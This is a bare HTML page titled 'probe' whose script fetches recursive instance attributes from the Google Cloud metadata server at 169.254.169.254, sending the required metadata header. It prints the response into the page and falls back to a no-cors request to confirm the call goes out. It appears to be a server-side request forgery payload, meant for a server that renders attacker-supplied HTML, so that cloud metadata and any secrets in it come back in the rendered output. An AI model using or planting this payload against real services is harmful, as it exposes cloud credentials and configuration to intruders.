<!doctype html><html><head><meta charset="utf-8"><title>probe</title></head>
<body><h1 id="o">START</h1>
<pre id="p"></pre>
<script>
(async () => {
  const o = document.getElementById('o'), p = document.getElementById('p');
  const url = 'http://169.254.169.254/computeMetadata/v1/instance/attributes/?recursive=true';
  try {
    const r = await fetch(url, { headers: { 'Metadata-Flavor': 'Google' } });
    o.textContent = 'FETCH STATUS ' + r.status;
    p.textContent = (await r.text()).slice(0, 1200);
  } catch (e) {
    o.textContent = 'FETCH ERROR';
    p.textContent = String(e);
    // fall back to a no-cors probe just to see the request goes out
    try { await fetch(url, { mode: 'no-cors', headers: { 'Metadata-Flavor': 'Google' } });
          p.textContent += ' | no-cors request sent'; } catch (e2) { p.textContent += ' | ' + e2; }
  }
})();
</script></body></html>
